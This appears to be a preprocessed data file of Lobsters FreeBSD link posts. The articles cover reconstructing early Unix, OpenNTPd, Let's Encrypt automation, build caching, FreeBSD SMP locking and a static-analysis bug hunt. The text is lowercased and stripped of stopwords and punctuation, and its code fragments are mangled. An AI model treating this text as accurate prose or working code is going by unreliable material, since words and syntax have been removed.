ocr program knew transcription error backtrack fix undaunted proceeded next stage learned syntax assembly code wrote assembler convert badly scanned text machine code set executable binary team store filesystem hit circular dependency nt know binary format filesystem version unix kernel kernel implemented filesystem get kernel boot order use purpose toomey decided use simulator reverseengineer basic layout bootable disk image wrote tool create image containing executables friend assembled chickenandegg work stage said get one little bit working use leverage next bit unix two inventor helped along way ken thompson minimalist communication toomey said unix heritage society brought version unix sent thompson series email thompson responded singleword message amazing incredible toomey said dennis ritchie alive enthusiastically supported project really miss awful lot unix history repository github valuable preserve snapshot oldfashioned system snapshot nt fit modern programmer method exploring history evolving code base today read history tool like git spinellis imported year unix code history git published repository github project build toomey accomplishment spinellis want code building momentbymoment history evolution linebyline attribution author contribution unix developed without version control first development moved university california berkeley late coder began tracking certain file early version control system called sccs even used file spinellis reconstructed much history could importing entire snapshot early unix version git single commits researched primary source like publication technical report man page name written comment source code attribute particular part code author since publishing repository github spinellis continued refine periodically recently discovered author unacknowledged git log whose contribution want add march copyright holder unix research edition granted permission distribute version history integrated repository additionally spinellis point followed one unix variant conclusion freebsd variant like netbsd openbsd old interesting story could added repository distinct branch spinellis toomey enjoy reading old unix code see much power early programmer could jam tiny memory footprint example unix toomey recovered last year minimalist masterpiece recognizable unix system including fork exec system call multiple user account file permission directory structure implemented word memory really source code important said toomey idea embodied effort protect unix code irrelevant said real value lie concept like connecting small utility together pipe implementing system portable programming language spinellis agrees examined edition unix edition unix saw even though bare prototype system already contained key architectural element modern unix abstracting io separating kernel commandline interpreter within year even powerful concept became visible device appeared file hierarchical filesystem shell ran user process distinct kernel first unix version contained basic idea inspired modern operating system dominates computing today log post comment
462,Lobsters,freebsd,FreeBSD,Introducing OpenNTPd in Base,https://hardenedbsd.org/article/shawn-webb/2017-06-27/introducing-openntpd-base,introducing openntpd base,,past month bernard spil hard work importing openntpd hardenedbsd base starting hardenedbsd ship openntpd default like libressl base hardenedbsd user choice building world ntp daemon use user want use legacy ntpd set withoutopenntpd withntp srcconf bernard continue maintaining libressl openntpd hardenedbsd base user upgrading existing system source use legacy ntp daemon base need perform following action install new world run mergemaster etcupdate sysrc ntpdenable sysrc localopenntpdenable yes binary update published within next hour contains openntpd base use hbsdupdate need perform step
463,Lobsters,freebsd,FreeBSD,Using Let's Encrypt within FreeBSD.org - lessons learned and advice (2016),https://blog.crashed.org/letsencrypt-in-freebsd-org/,using let encrypt within freebsdorg lesson learned advice,people love query http letsencryptorgdocsratelimits http slashdotorg twitter contact info,decided give let encrypt certificate shot personal web server earlier year disaster startssl like share learned biggest gotcha people tend develop bad habit deal certificate year beginning part process manual deployment certificate somehow never quite get automated thing get left change let encrypt certificate instead year lifetime certificate let encrypt certificate valid day people wanting renew every day force issue really need automate make robust let encrypt folk provide tool common case run actual machine manages certificate adjusts server configuration file goal provide baseline shakenbake solution willing give level control third party tool server absolutely question freebsdorg cluster let encrypt acme ecosystem developing rich set component lot option default tool suit probably mention thing freebsdorg cluster many people would find bit strange biggest problem deal traditional model firewallbastion u apply design assumption hostile user already inside network cluster spread distinct site naked internet vpn actually little trust system network eg ssh people headless user ssh password sudo ca nt used command control system use signing nt trust anything address assume mitm thing general thing constructed trigger polling pull based one thing much try slave configuration directly source control eg nginxconf various site come directly admin repository dns zone file aim automation committoproduction downside make automation integration let encrypt client interesting server configuration file ca nt modified replicated web infrastructure literally readonly via jailsnullfs dns zone file static headless user ca nt ssh therefore commits verification token automated fashion interesting indeed first encounter let encrypt ecosystem widely used third party client known deyhydrated solid choice ended switching away freebsdorg number thing nt like nt like way hook worked time way handled transient problem biggest complaint admittedly rather petty requirement bring bash support footprint jail use acmesh instead acmesh nice simple work straight binsh right hook mechanism could use validation acme process fairly simple face value create account verify administrative control domain placing random cookie http server dns make signing request receive certificate wanted able use certificate thing like ldap smtp server ca nt http file verification use dns validation domain come back static zone file issue hinted solved freebsdorg specific situation folk may find amusing get idea going try keep detail lean site avoid overload first jail nothing except acmesh support tool inside btw love jail freebsd cluster use everywhere stub dns api hook look loosely like usage dnsfbsdadd acmechallengewwwdomaincom dnsfbsdadd fulldomain txtvalue info adding dns fulldomain txtvalue echo fulldomain txt txtvalue homecertbotdnsextra fulldomain return corresponding removal counterpart hook script creates homecertbotdnsextraacmechallengefoofreebsdorg simply wait minute homecertbotdnsextra directory nullfs mounted readonly another jail cron task jail poll subversion server update dns zone file also check nullfs directory change addition whitelist filtered record type sanity checked mechanism insert txt record nt actual script gist cat dnsextra freebsdorg grep txt extrafreebsdorgtxt makefile compiles zone file fragment something like cat soafreebsdorg primaryfreebsdorg extrafreebsdorgtxt unsignedfreebsdorg rude crude new unsignedfreebsdorg signed published via opendnssecnsd let encrypt validator see acmechallenge token within minute prove administrative control domain verified let encrypt ca issue certificate export fullchain file publication location another jail read fullchain certificate via nullfs published nonsecrets update mechanism since using dnssec good opportunity maintain signed tlsa fingerprint map file subversion tell builder tlsa fingerprint come certificate file catch tlsa record update managing update event horizon supposed fingerprint listed across update cycle use tlsa record avoid issue propagation delay tlsa change every renewal change generate new private key dns makefile something like foreach cert domain port ldnsdane c certfile cert domain port extra porttcp domain creates file like using portsdnsldns remember concatenation script rule made conveniently insert tlsa record zone file well also automated sshfp record signing publication another jail collect fingerprint phonehome mechanism make available zone compiler via nullfs deployment fingerprint published certificate magically flow backend jail via internal command control management system major gotcha nginxconf something like sslcertificate etcsslfoofreebsdorgcrt service nginx reload happens said reloads certificate would dead wrong majority tlsssl server require full restart reload certificate filename unchanged found hard way something creative like giving certificate filename timestamp distributiondeployment mechanism generally cause reload certificate reload server freebsdorg cluster file hence certificate pathnames static u mean restarts every day restart trigger postfix nginx nghttpx ldap apache fairly simple look bit like butchered space binsh postfixreload certfiles postconf n awk f certkey file print sort u reloadfalse f certfiles f f varspoolpostfixpidmasterpid ot f reloadtrue fi fi done reload echo postfix masterpid file older certificate restart required service postfix restart fi crude add sanity check make sure exposed user provided input script fragment simply restarts postfix certificate private key updated private key current system nt serverspecific secret distribution mechanism acmesh reuse private key manually transport private key destination server onetime bootstrap dehydrated regenerates private key time default configured running everything server sort thing generally nt issue acmesh bit obscure configure fragment accountconf file leocspstable disable due nginx bug lekeylength lewebroot dnsfbsd use script defaultdnssleep minute nodetectsh tweak internal setting via file sure punished supposed set thing like dns api command line read script subverted example issuing certificate first time home acmesh issue examplewemmorg mon nov pst creating domain key mon nov pst single domainexamplewemmorg mon nov pst getting domain auth token domain mon nov pst getting webroot domainexamplewemmorg mon nov pst wdnsmyapi mon nov pst getting newauthz domainexamplewemmorg mon nov pst try newauthz time mon nov pst newauthz request ok mon nov pst found domain api file homecertbotacmeshdnsapidnsmyapish mon nov pst adding dns acmechallengeexamplewemmorg mon nov pst sleep second txt record take effect mon nov pst verifying examplewemmorg mon nov pst success mon nov pst removing dns acmechallengeexamplewemmorg mon nov pst verify finished start sign mon nov pst cert success begin certificate deleted end certificate mon nov pst cert homecertbotacmecertsexamplewemmorgexamplewemmorgcer mon nov pst cert key homecertbotacmecertsexamplewemmorgexamplewemmorgkey mon nov pst intermediate ca cert homecertbotacmecertsexamplewemmorgcacer mon nov pst full chain cert homecertbotacmecertsexamplewemmorgfullchaincer counting second plus dns propagation time second home use different dns push mechanism see authentication domain validation certificate phase forced renewal acmesh renew photoswemmorg force mon nov pst renew photoswemmorg mon nov pst single domainphotoswemmorg mon nov pst getting domain auth token domain mon nov pst getting webroot domainphotoswemmorg mon nov pst wdnsmyapi mon nov pst getting newauthz domainphotoswemmorg mon nov pst try newauthz time mon nov pst newauthz request ok mon nov pst photoswemmorg already verified skip mon nov pst photoswemmorg already verified skip mon nov pst verify finished start sign mon nov pst cert success begin certificate deleted end certificate mon nov pst cert homecertbotacmecertsphotoswemmorgphotoswemmorgcer mon nov pst cert key homecertbotacmecertsphotoswemmorgphotoswemmorgkey mon nov pst intermediate ca cert homecertbotacmecertsphotoswemmorgcacer mon nov pst full chain cert homecertbotacmecertsphotoswemmorgfullchaincer example took second renew certificate nt need dns validation thing set cron entry typically something like acmesh cron devnull generates error text problem otherwise news good news inserting tlsa record like check signed fingerprint match certificate ldnsdane verify wwwfreebsdorg danevalidated successfully danevalidated successfully caveat like mention nt enable ocspmuststaple serving nginx set flag certificate promising always stapling enabled server catch nginx broken nt actually ocsp stapling query firefox correctly complain bitterly every server restart stress enough make sure full handsoff test renewal see full endtoend flow work forced early renewal like acmesh renew foofreebsdorg force watch nt want find two month reload script take site point article talk strategy automating watch rate limit kidding test staging certificate first http letsencryptorgdocsratelimits confused first say renewal exempted still count weekly certificate limit bulk renew certificate fine ca nt anything else day later acmesh move fast active development cautious update stuff nt hard always solution even self inflicted problem quite easy using something proper dns api access think opportunity exercise creativity httpbased domain validation process easiest work monitoring system use really nt set surprise use rotating backup key cert material particularly something like acmesh dehydrated allow directly access work area hard oops something paying attention final thought free certificate commercial one well certificate lowest common denominator thing used domain validated certificate freebsdorg provided signing chain widely trusted practical difference browser free commercial domain validated certificate day day lifetime solveable automation http slashdotorg us let encrypt certificate quite ready prime time secondly brain surgery week ago set home one week surgery freebsdorg cluster exactly two week people give hell crappy scripting excuse ready go link comment twitter contact info
464,Lobsters,freebsd,FreeBSD,Re-Writing BSD 4.4 Shell Commands: echo,https://www.rewritinghistorycasts.com/screencasts/echo,rewriting bsd shell command echo,rewriting history cast mirror copyright stuff reiterate license,rewriting history cast mirror stumbled upon youtube channel learn computer quickly became fascinated concept write basic functionality common bash command content creator created video short span outright stop uploading two year since upload activity video however see originally code posted content creator website rewritinghistorycastscom upon trying visit site noticed longer existed surprisngly domain owned nt seem like time felt bad really educational video getting buried hidden away time ticked wanted create mirror people able visualize code copyright stuff nt code name video bought domain rewritinghistorycastscom therefore technically portion however original content creator come back happy hand domain reiterate nt channel learn computer nt code transcribed code video educational purpose license listing rpeository gnu due nature code originally written rather credited original author learn computer simple transcription video archival purpose
465,Lobsters,freebsd,FreeBSD,Speeding up builds on FreeBSD,https://xmj.github.io/articles/sysadmin/builds_ccache_memcached.html,speeding build freebsd,speeding build freebsd dirdeps poudriere ccache poudriere ccache memcached kernel base ccache memcache additional reading http wwwcruftynetsjgblogbuildingbsdpdf,speeding build freebsd repeatedly building component freebsd operating system kernel base userland interested optimizing build duration luckily time various commercial user freebsd figured various way speeding build process probably obvious way shaving time rebuild thing changed article like show way achieving user perspective kernelbase build one way achieving using meta mode make make capture information relevant next build meta file compiler invocation file read compile including includes location library used interesting syscalls issued etc make achieves using filemon interface required eg tracing syscalls issued make execution subsequent run meta file found make determines information meta file still contains uptodate information eg comparing proposed past compiler invocation comparing access time library code used object previously built rebuilds object metamode used setting following etcsrcenvconf loading filemon kernel module using metamode rebuilt hardenedbsd worldkernel thinkpad within ten minute dirdeps using dirdeps leverage metadata built using make metamode information present built meta file used derive dependency graph way taking example binsh building sh also dependency case libc libcompilerrt libedit libncursesw etc feature used derive full graph source tree traverse unnecessarily building thing right order dirdeps enabled setting following etcsrcenvconf setting implies various option including abovementioned metamode automatic build objdirs staging install test directory etc note main use quickly able test change running system may useful development poudriere ccache previously built maintained repository using poudriere hopefully noticed default rebuilds thigns necessary example case version update shlib bump dependency change selected option even recompilation previously built port increased using ccache cache compilation result result metadata within poudriere enable feature setting ccachedirpathtoccachedir poudriereconf directory exist creating optionally store config file ccacheconf setting limit maximum cache size default many poudriere ccache memcached package build box among beefier variant thinkpad quite may worthwile using memcached store previous compilation output previously installed ccache poudriere pkg delete replace poudrieredevel later ccachememcachedstatic time writing latest poudriere release yet obtained necessary ccache enhancement static ccache required work buildjails without obtaining circular dependency libmemcached within poudriereconf additionally set following ccachestaticprefixusrlocal restrictnetworkingno done previous step create ccacheconf add two line memcachedconf memcachedonly true last least execute following enable start memcached sysrc memcachedenableyes sysrc memcachedflags l localhost megabyte service memcached start adjust amount megabyte whatever buildbox support start bulk run get thing going kernel base ccache memcache builtin support ccache within freebsd base build system next step leverage configuration enabling withccachebuildyes srcconf using metamode dirdeps ccache memcached together additional reading original metamode talk given sjg bsdcan http wwwcruftynetsjgblogbuildingbsdpdf ccache list various option could used tuneadjust ccache behavior memcached list option could used enable sasl authentication
466,Lobsters,freebsd,FreeBSD,Improving the FreeBSD SMP implementation (2001),https://www.usenix.org/legacy/event/usenix01/freenix01/full_papers/lehey/lehey_html/,improving freebsd smp implementation,improving freebsd smp implementation greg lehey introduction use processor time kernel data object synchronizing process interrupt protection waiting half adapting unix model smp initial freebsd model solve dilemma new freebsd implementation interrupt thread locking construct removing big kernel lock idle process recursive locking migrating finegrained locking migrating interrupt handler kernel trace facility witness facility project status performance acknowledgement bibliography reference freebsd smp home page,pp proceeding improving freebsd smp implementation greg lehey ibm ltc ozlabs abstract unixderived operating system traditionally simplistic approach process synchronization unsuited multiprocessor application initial freebsd smp support kept approach allowing one process run kernel mode time also blocked interrupt across multiple processor causing seriously suboptimal performance io bound system paper describes work done remove bottleneck replacing finegrained locking derives work done bsdos many similarity approach taken sunos synchronization performed primarily locking construct intermediate spin lock binary semaphore termed mutexes general mutexes attempt block rather spin case likely wait time long enough warrant process switch issue blocking interrupt handler addressed attaching process context interrupt handler despite process context interrupt handler normally run context interrupted process scheduled blocking required introduction crucial issue design operating system manner share resource memory data structure processor time unix model main client resource process interrupt handler interrupt handler operate completely kernel space primarily behalf system process normally run one two different mode user mode kernel mode user mode code code program process derived kernel mode code part kernel structure give rise multiple potential conflict use processor time obvious demand process interrupt routine place system want run must execute instruction traditional unix rule governing sharing one processor code run interrupt handler process available run interrupt handler run interrupt handler different priority one interrupt handler running one higher priority becomes runnable higher priority interrupt immediately preempt lower priority interrupt scheduler run process voluntarily relinquishes processor time slice expires higherpriority process becomes runnable scheduler chooses highest priority process ready run process kernel mode time slice expires higher priority process becomes runnable system wait return user mode sleep running scheduler method work acceptably single processor machine designed following section see reasoning behind last decision kernel data object obvious problem access memory modern unix system run memory protection prevents process user mode accessing address space process protection longer applies kernel mode process share kernel address space need access data shared process example fork system call need allocate proc structure new process file syskernforkc contains following code int flag procp struct proc int flag struct proc procp struct proc pptr allocate new proc newproc zalloc proczone function zalloc take struct proc entry freelist return address item z zitems z zitems void item return item happens currently executing process interrupted exactly first two line code maybe higher priority process want run item contains pointer process structure z zitems still point interrupting code also allocates process structure go code return pointer memory area creating process equivalent siamese twin unix solves issue rule unix kernel nonpreemptive mean process running kernel mode process execute kernel code first process relinquishes kernel voluntarily either returning user mode sleeping synchronizing process interrupt nonpreemption rule applies process interrupt happen independently process context different method needed device driver process context top half interrupt context bottom half must share data two separate issue arise half must ensure change shared data structure occur consistent manner must find way synchronize protection half must protect data change half example buffer header structure contains flag word flag set reset half setting resetting bit requires multiple instruction architecture potential data corruption exists unix solves problem locking interrupt critical section top half code must explicitly lock interrupt spl function naming go back early day unix relatively simplistic levelbased interrupt structure running specific level higher priority interrupt allowed unix named function setting interrupt priority level spl instruction initially function name like later machine came interrupt mask bsd changed name descriptive name splbio block io splhigh block interrupt one significant source bug driver inadequate synchronization bottom half interrupt code need perform special synchronization definition process nt run interrupt code active blocking interrupt potential danger interrupt serviced timely fashion pc hardware particularly evident serial io frequently generates interrupt every character bps equates interrupt every past given rise dreaded silo overflow even fast modern hardware problem also easy decide interrupt priority early day disk io given high priority order avoid overrun serial io low priority nowadays disk controller handle transfer overrun still problem serial io waiting half case process need wait event complete obvious example io process issue io request driver initiate transfer long time transfer completes reading keyboard input example could week io completes transfer completes cause interrupt interrupt handler finally determines transfer complete notifies process traditional unix performs synchronization function sleep wakeup though current bsd longer us sleep replaced tsleep offer additional functionality top half driver call sleep tsleep want wait event bottom half call wakeup event occurs detail process issue system call read brings kernel mode read locates driver device call initiate transfer read next call tsleep passing address unique object related request tsleep store address proc structure mark process sleeping relinquishes processor point process sleeping later point request complete interrupt handler call wakeup address passed tsleep wakeup run list sleeping process wake process waiting particular address method problem even single processor time wake process depends number sleeping process usually slightly le number process system freebsd address problem hashed sleep queue effectively diminishing search time factor large system might process running time partial solution addition permissible one process wait specific address extreme case dozen process wait specific address one able run resource becomes available rest call tsleep term thundering horde devised describe situation freebsd partially solved issue wakeupone function wake first process find still involves linear search possibly large number process structure potential deadlock two unrelated event map address adapting unix model smp number basic assumption model longer apply smp others become problem one processor available code run parallel interrupt handler user process run different processor time nonpreemption rule longer sufficient ensure two process ca nt execute time would theoretically possible two process allocate memory locking interrupt must happen every processor adversely affect performance initial freebsd model original version freebsd smp support solved problem manner designed reliability rather performance effectively found method simulate singleprocessor paradigm multiple processor specifically one process could run kernel one time system ensured spinlock socalled big kernel lock bkl ensured one processor could kernel time entry kernel processor attempted get bkl another processor executing kernel mode processor performed busy wait lock became free mpgetlockedx movl edx eax movl eax ecx andl cpufield ecx cmpl cpulockid ecx jne incl eax movl eax edx ret movl freelock eax movl cpulockid ecx incl ecx lock cmpxchg ecx edx jne grabhwi ret extreme case waiting could degrade smp performance single processor machine solve dilemma multiple processor machine around long time since unix written time number solution kind problem devised problem le find solution find solution would fit unix environment least following synchronization primitive used past counting semaphore originally designed share certain number resource amongst potentially consumer get access consumer decrement semaphore counter finished increment semaphore counter go negative process placed sleep queue go first process sleep queue activated approach possible alternative tsleep wakeup synchronization particular avoids lengthy sequential search sleeping process sunos us turnstile address sequential search problem tsleep wakeup synchronization turnstile separate queue associated specific wait address need sequential search disappears spin lock already mentioned freebsd used spin indefinitely bkl nt make sense useful case wait short longer wait result process suspended subsequently rescheduled average wait resource le time make sense spin instead blocking lock alternative spin lock wait likely longer would take reschedule typical implementation similar counting semaphore count condition variable kind blocking lock lock based condition example absence entry queue readwrite lock address different issue frequently multiple process may read specific data parallel one may write confusion terminology locking primitive particular term mutex applied nearly different time look freebsd us term next section one big problem locking primitive exception spin lock block requires process context unix interrupt handler ca nt block one reason old bkl spinlock even though could potentially use processor time spinning new freebsd implementation new implementation smp freebsd base heavily implementation bsdos yet released even name smpng new generation taken bsdos due open source nature freebsd smpng available freebsd bsdos radical difference smpng interrupt code bottom half run process context enabling block necessary process context termed interrupt thread interrupt lockout primitive splfoo removed lowlevel interrupt code still need block interrupt briefly interrupt service routine run interrupt enabled instead locking interrupt system us mutexes may either spin lock blocking lock interrupt thread single important aspect implementation introduction process thread context interrupt handler change involves number tradeoff process context allows uniform approach synchronization longer necessary provide separate primitive synchronize top half bottom half particular spl primitive longer needed compatibility reason call retained translate noops action scheduling another process take significantly longer interrupt overhead also remains unix approach scheduling allow preemption process running kernel mode smpng solves latency scheduling issue technique known lazy scheduling receiving interrupt interrupt stub note pid interrupt thread schedule thread instead continues execution context interrupted process thread scheduled following circumstance thread block interrupt nesting level get deep expect method offer negligible overhead majority interrupt scheduling viewpoint thread differ normal process following way never enter user mode user text data segment share address space process swapper run higher priority user process priority adjusted based load remains fixed additional process state swait introduced interrupt process currently idle normal idle state ssleep implies process sleeping experience bsdos implementation showed initial implementation interrupt thread particularly errorprone process debugging tool inadequate due nature freebsd project considered imperative system relatively functional time transition decided implement interrupt thread two stage initial implementation similar normal process offered benefit relatively easy debugging stability disadvantage significant drop performance interrupt could potentially cause two context switch interrupt would handled another process even user process kernel experience initial implementation met expectation seen stability problem implementation performance though significantly worse bad expected time writing improved implementation somewhat allowing limited kernel preemption allowing interrupt thread scheduled immediately rather wait current process leave kernel mode potential exists complete kernel preemption higher priority process preempt lower priority process running kernel sure benefit outweigh potential bug source final lazy scheduling implementation tested currently current kernel due current kernel lock implementation would show significant performance increase problem expected additional kernel component migrated giant interrupt changed threaded interrupt particular old fast interrupt remain relatively unchanged restriction may use blocking mutexes fast interrupt typically used serial driver specific freebsd bsdos corresponding functionality locking construct initial bsdos implementation defined two basic type lock called mutex default locking construct spinsleep mutex similar concept semaphore count implementation allows spinning certain period time appears benefit word likely mutex become free le time would take schedule another process though feature currently use also allows user specify mutex spin process obtain mutex placed sleep queue woken resource becomes available alternate construct spin mutex corresponds spin lock already present system spin mutexes used exceptional case implementation lock derived almost directly bsdos since modified significantly addition lock freebsd project included two locking construct condition variable built top mutexes consist mutex wait queue following operation supported acquire condition variable cvwait cvwaitsig cvtimedwait cvtimedwaitsig acquiring condition variable associated mutex must held mutex released sleeping reacquired wakeup unblock one waiter cvsignal unblock waiter cvbroadcast wait queue empty cvwaitqempty functionality available msleep function sharedexclusive lock sx lock effectively readwrite lock difference terminology came intention add additional functionality lock functionality implemented currently sx lock thing readwrite lock allow access multiple reader single writer implementation sx lock relatively expensive struct sx struct lockobject sxobject struct mtx sxlock int sxcnt struct cv sxshrdcv int sxshrdwcnt struct cv sxexclcv int sxexclwcnt struct proc sxxholder used vast majority access shared create sx lock sxinit attain read shared lock sxslock release sxsunlock attain write exclusive lock sxxlock release sxxunlock destroy sx lock sxdestroy removing big kernel lock modification made possible remove big kernel lock initial implementation replaced two mutexes giant used similar manner bkl blocking mutex currently protects entry kernel including interrupt handler order able block must allow scheduling continue schedlock spin lock protects scheduler queue combination lock supplied bare minimum lock necessary build new framework improve performance system since process still block giant idle process planned lightweight interrupt thread need process context order work traditional unix kernel always process context pointer curproc null smpng solves problem idle process run process active recursive locking normally lock locked locked occasion however possible process try acquire lock already hold without special check would cause deadlock many implementation allow socalled recursive locking locking code check owner lock owner current process increment recursion counter releasing lock decrement recursion counter release lock count go zero much discussion literature freebsd smp project whether recursive locking allowed general feeling recursive lock evidence untidy programming unfortunately code base never designed kind locking particular library function may attempt reacquire lock already held come compromise general discouraged recursion must specifically enabled mutex thus avoiding recursion intended migrating finegrained locking implementing interrupt thread replacing big kernel lock giant schedlock result performance improvement provided framework transition finegrained locking could performed next step choose locking strategy migrate individual portion kernel protection giant one danger approach locking conflict might recognized late particular freebsd project different people working different kernel component strong centralized architectural committee determine locking strategy result developed following guideline locking use sleep mutexes spin mutexes used special case approval smp project team current exception rule scheduler lock nature must spin lock tsleep holding mutex giant implementation tsleep cvwait automatically release giant gain wakeup mutexes released msleep cvwait holding mutex giant mutex passed parameter msleep msleep new function combine functionality atomic release regain specified mutex call function grab giant sleep unless mutexes possibly giant held consequence previous rule calling msleep cvwait holding giant another mutex giant must acquired first released last avoids lock order reversal except giant mutex used transition phase mutexes protect data code msleep cvwait recursed mutex giant special case handled automagically behind scene nt pas giant function try hold mutexes little time possible try avoid recursing mutexes possible general mutex recursively entered mutex held long redesign order one weakness project structure overall strategy locking many case choice locking construct granularity left individual developer almost every case lock leaf node lock little code lock one lock time tight context result relatively reliable code may result optimum performance number reason persist approach freebsd volunteer project developer think best unlikely agree alternative implementation currently enough architectural direction enough experience smp system come ideal locking strategy derives volunteer nature project note also large unix vendor found choice locking strategy big problem unlike large company much le concern throwaway implementation find performance system component suboptimal discard start different implementation migrating interrupt handler new basic structure place implementation finer grained locking proceeding giant remain legacy locking mechanism code converted new locking mechanism example main loop function ithreadloop run interrupt handler contains following code ih ihflags ihmpsafe mtxlock giant ih ihhandler ih ihargument ih ihflags ihmpsafe mtxunlock giant flag intrmpsafe indicates interrupt handler synchronization primitive typical strategy planned migrating device driver involves following step add mutex driver softc set intrmpsafe flag registering interrupt obtain mutex kind situation previously spl used unlike spls however interrupt handler must also obtain mutex accessing shared data structure probably difficult part process involve larger component system file system networking stack example bsdos code currently clear best path follow kernel trace facility ktr package provides method tracing kernel event debugging purpose intended use normal operation confused kernel call trace facility ktrace example function schedithd schedule interrupt thread contains following code ktrintr schedithd pid need ir itproc ppid ir itproc pcomm ir itneed ir itproc pstat swait ktrintr schedithd setrunqueue ir itproc ppid function ithdloop run interrupt process context contains following code beginning end main loop ktrintr ithdloop pid need itproc ppid itproc pcomm itneed ktrintr ithdloop pid done itproc ppid miswitch ktrintr ithdloop pid resumed itproc ppid call two macro compile kind code kernel built ktr kernel option kernel contains option bit ktrintr set variable ktrmask event masked circular buffer kernel ddb debugger command show ktr dump buffer one page time gdb macro also available give relatively useful mean tracing interaction process ithdloop pid ithdloop pid clk ithdloop pid resumed schedithd setrunqueue schedithd pid clk example trace arrival processing clock interrupt platform reverse chronological order number beginning line trace entry number entry show arrival interrupt beginning schedithd second value trace line time since epoch followed cpu number file name line number remaining value supplied program function entry show second trace call schedithd interrupt handler placed run queue entry show entry main loop ithdloop entry show exit main loop ithdloop witness facility witness code designed specifically debug mutex code keep track lock acquired released thread also keep track order lock acquired respect time lock acquired witness us two list verify lock acquired wrong order lock order violation detected message output kernel console detailing lock involved location question witness also configured drop kernel debugger order violation occurs witness code also check various condition verifying one recurse nonrecursive lock sleep lock witness verifies new process would switched lock released lock blocked acquire spin lock held check fail kernel panic project status project started june major milestone development june ported bsdos mutex code replaced big kernel lock giant schedlock september replaced interrupt handler heavyweight interrupt processor initial commit freebsd source tree november made softclock mpsafe migrate giant january implemented condition variable march implemented readwrite lock called sharedexclusive sx lock march complete locking enough proc structure allow signal handler moved giant main issue immediate future migrate code giant detail identified following major task advanced state implementation split nfs client server add locking nfs make ip stack threadsafe create mechanism cdevsw structure protect threadunsafe driver complete locking struct proc cleanup various mpmachdepc unify various smp api ipi delivery etc make printf safe call almost situation avoid deadlock make mbuf system use condition variable instead msleep wakeup remove mp safe syscall flag system call table add explicit mtxlock giant system call need use percpu buffer ktr reduce synchronization remove priority argument msleep cvwait implement lazy interrupt thread switching context stealing lock structs filedesc pgrp sigio session ifnet make virtual memory subsystem threadsafe convert select use condition variable reimplement kqueue using condition variable conditionalize atomic operation used debugging statistic lock virtual file system code performance implementation progressed far enough make firm statement performance expecting reasonable scalability beyond processor system acknowledgement freebsd smpng project made possible bsdi generous donation code development version bsdos main contributor john baldwin rewrote low level interrupt code smp made much code machine independent worked witness code converted allproc proctree lock lockmgr lock sx lock created mechanism cdevsw structure protect threadunsafe driver locked struct proc unified various smp api ipi delivery jake burkholder ported bsdos locking primitive implemented msleep condition variable kernel preemption matt dillon converted big kernel spinlock blocking giant lock added scheduler lock percpu idle process jason evans made malloc friend threadsafe converted simplelocks mutexes implemented sx sharedexclusive lock greg lehey implemented heavyweight interrupt thread rewrote low level interrupt code removed spls ported bsdos ktr code bosko milekic made sfbufs threadsafe cleaned mutex api made mbuf system use condition variable instead msleep doug rabson ported bsdos locking primitive implemented heavyweight interrupt thread rewrote low level interrupt code alpha architecture contributor tor egge seth kingsley jonathan lemon mark murray chuck paterson bill paul alfred perlstein dagerling peter wemm bibliography per brinch hansen operating system principle prenticehall marshall kirk mckusick keith bostic michael j karels john quarterman design implementation operating system addisonwesley curt schimmel unix system modern architecture addisonwesley uresh vahalia unix internals prenticehall reference freebsd smp home page paper originally published proceeding freenix track usenix annual technical conference june boston masssachusetts usa last changed june bleu
467,Lobsters,freebsd,FreeBSD,How to find 56 potential vulnerabilities in FreeBSD code in one evening,https://medium.com/@Coder_HarryLee/how-to-find-56-potential-vulnerabilities-in-freebsd-code-in-one-evening-4ecee6eebaf4,find potential vulnerability freebsd code one evening,find potential vulnerability freebsd code one evening analysis pvsstudio episode episode false positive far project medium portal project ifdef undef endif define static const struct undef warning new view world pvsstudio searching software weakness cve potential vulnerability null pointer dereference void qlmbxisr void return static int ecoreiltclientmemop struct int int struct struct return struct offsetof define null pointer dereferencing cause undefined behavior static struct iscsioutstandingadd struct struct union struct int sizeof return static void iscsiactionabort struct union int radeoncsioctl struct void struct struct return static void bwntxpwr void int struct struct struct void ipfwaddobjrewriter struct sizet sizeof sizeof sizeof sizeof static int mlyusercommand struct struct struct return use sizeof pointer type struct safamilyt char char uidt pidt uidt pidt static void struct sizeof sizeof use uninitialized variable tdsasendtmfioctl void void unsigned long tmfpassthroughreqt endif return return buffer access incorrect length value typedef struct qlsmpidglblhdrt struct qlsmpidglblhdrt typedef struct qlsmpicoredumpt int qlsmpicoredump qlahostt qlsmpicoredumpt sizeof sizeof improper validation array index static void sbptargmgmhandler struct int break access violation define define define struct void struct int struct const struct else else incorrect block delimitation static int smbfsgetattr struct return assignment variable without use unused variable int ipfpftpport frinfot ipt natt ftpinfot int else static inline int ecorefuncsendswitchupdate struct struct static int ixgbeaddvf devicet const nvlistt else typedef struct lsigsett int linuxsigreturn struct struct lsigsett static int sysctlchgloglevel int return return last line effect explained static int uathtxstart struct struct struct struct static void static void struct void struct expression always false scifuserparametersset return unsigned int libaliassetmode static int ngnatrcvmsg break struct static void dtracedebugoutput void char uintptrt uintptrt else char uintptrt uintptrt uintptrt uintptrt else expression always true int mfitboltsendframe struct struct return static void safemcopy struct struct caddrt break return caddrt break return define define mpidekmanagementrsp static int ugidfwrulevalid struct return return return return return return return define compiler removal code clear buffer int struct struct struct int struct sizeof sizeof sizeof sizeof return dead code static int wipciresume devicet struct struct return return miscellaneous static void macprocvmrevokerecurse struct struct struct static int cyaparawinput struct struct int static int linuxmsqidpushdown struct caddrt else int ipfpirccomplete char sizet return return time pvsstudio conclusion downloading pvsstudio feedback form,find potential vulnerability freebsd code one eveningit high time recheck freebsd project show even serious qualitative project pvsstudio easily find error time decided take look analysis process term detecting potential vulnerability pvsstudio always able identify defect could potentially used hacker attack however focused aspect analyzer described error typo consequence sloppy copypaste never classified according cwe example nowadays popular speak security vulnerability try broaden perception analyzer pvsstudio help search bug also tool improves code securityabout analysisyou may find report check freebsd project hereas name implies article describe fragment found one evening ie spent hour looking potential vulnerability show power pvsstudio static analyzer recommend using analyzer care code quality moreover reliability resistance possible attacksit take long find error code took three week sit start writing article time even fixed error described post new project weakness detected pvsstudio week episode episode course fixed error clear fix without digging deep algorithm freebsd author really deeper analysis review limited number error presented ready provide temporary license key also help eliminate false positive may hinder work way speaking false positiveshaving checked project pvsstudio chance get wide spread number false positive example recently checked far project number false positive amounted excellent result meaning every second message indicates error extremely bad code checking medium portal project result even better false positivesthe case freebsd complicated thing analyzer issued large number general analysis high medium levelthe majority message false positive hard evaluate exactly think number mean show point discussing number false positive large project without proper setting analyzer vast majority false positive appears various macro easily eliminated using variety mechanism provided pvsstudio explain using exampleyou may see array freebsd 